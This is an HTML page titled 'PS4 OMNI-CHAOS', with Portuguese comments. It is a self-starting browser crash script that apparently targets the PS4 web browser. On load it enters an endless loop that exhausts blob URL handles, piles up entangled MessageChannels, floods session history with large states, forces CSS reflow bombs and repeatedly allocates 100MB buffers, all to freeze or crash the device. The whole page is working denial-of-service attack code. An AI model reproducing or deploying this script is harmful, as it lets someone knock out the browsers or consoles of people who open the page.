<!DOCTYPE html>
<html>
<head>
    <title>PS4 OMNI-CHAOS (Resource Exhaustion)</title>
    <style>
        body { background: #220000; color: #ff0000; font-family: monospace; overflow: hidden; }
        #hud { 
            position: fixed; top: 0; left: 0; width: 100%; 
            background: rgba(50, 0, 0, 0.9); border-bottom: 5px solid red; 
            padding: 20px; z-index: 9999; font-size: 24px; font-weight: bold;
        }
        /* CSS Bomb: Cálculos complexos para travar a thread de renderização */
        .css-bomb {
            width: calc(10px * (100 / 3) + 5px);
            height: calc(min(10vh, 50px) * max(10, 20));
            transform: rotate(calc(1deg * var(--rot)));
            transition: all 0.1s;
            background: red;
            position: absolute;
        }
    </style>
</head>
<body>
    <div id="hud">
        CHAOS LEVEL: <span id="level">Iniciando...</span><br>
        BLOBS: <span id="blob-count">0</span> | CHANNELS: <span id="chan-count">0</span>
    </div>
    <div id="arena"></div>

    <script>
        const hudLevel = document.getElementById('level');
        const hudBlobs = document.getElementById('blob-count');
        const hudChans = document.getElementById('chan-count');
        const arena = document.getElementById('arena');
        
        let blobs = [];
        let channels = [];
        let cycle = 0;

        // ================= VETOR 1: BLOB / URL HANDLE EXHAUSTION =================
        // Tenta esgotar o número máximo de arquivos/urls que o navegador pode segurar
        function stormBlobs() {
            try {
                for(let i=0; i<500; i++) {
                    // Cria um arquivo falso na memória
                    let b = new Blob(["A".repeat(1024)], {type: 'application/octet-stream'});
                    // Registra no sistema (consome um Handle do Kernel)
                    let u = URL.createObjectURL(b);
                    blobs.push(u);
                }
                hudBlobs.innerText = blobs.length;
                
                // Se tivermos muitos, revoga metade para forçar fragmentação
                if (blobs.length > 50000) {
                    for(let i=0; i<25000; i++) URL.revokeObjectURL(blobs.shift());
                }
            } catch(e) {}
        }

        // ================= VETOR 2: MESSAGE CHANNEL ENTANGLEMENT =================
        // Cria nós de comunicação cíclicos impossíveis de resolver
        function tangleChannels() {
            try {
                for(let i=0; i<100; i++) {
                    let mc = new MessageChannel();
                    // Envia a porta 2 através da porta 1 (Entanglement)
                    mc.port1.postMessage("tangle", [mc.port2]);
                    channels.push(mc); // Segura a referência
                }
                hudChans.innerText = channels.length;
                
                // Limpeza parcial para o GC tentar (e falhar) limpar os ciclos
                if (channels.length > 5000) channels = []; 
            } catch(e) {}
        }

        // ================= VETOR 3: HISTORY FLOOD =================
        // Spamma o histórico para corromper o estado da sessão
        function floodHistory() {
            try {
                let state = { data: "X".repeat(10000) }; // Objeto pesado
                for(let i=0; i<50; i++) {
                    history.pushState(state, "", "#" + i);
                }
            } catch(e) {}
        }

        // ================= VETOR 4: CSS RECALC BOMB =================
        // Cria elementos que exigem cálculos matemáticos pesados
        function cssBomb() {
            if (arena.childElementCount > 200) arena.innerHTML = "";
            
            for(let i=0; i<20; i++) {
                let el = document.createElement('div');
                el.className = 'css-bomb';
                el.style.setProperty('--rot', Math.random() * 360);
                el.style.left = (Math.random() * 100) + "vw";
                el.style.top = (Math.random() * 100) + "vh";
                
                // Força leitura de layout (Reflow) no meio da criação
                let _ = el.getBoundingClientRect(); 
                
                arena.appendChild(el);
            }
        }

        // LOOP DA MORTE
        async function loop() {
            while(true) {
                cycle++;
                hudLevel.innerText = "AGRESSIVIDADE MÁXIMA: " + cycle;
                
                // Executa TODOS os vetores simultaneamente
                stormBlobs();
                tangleChannels();
                floodHistory();
                cssBomb();

                // Pausa minúscula apenas para atualizar a tela (senão congela sem mostrar nada)
                await new Promise(r => setTimeout(r, 10));
                
                // A cada 100 ciclos, tenta forçar um erro fatal no garbage collector
                if (cycle % 100 === 0) {
                    try { new ArrayBuffer(1024 * 1024 * 100); } catch(e){}
                }
            }
        }

        // Início rápido
        setTimeout(loop, 500);

    </script>
</body>
</html>
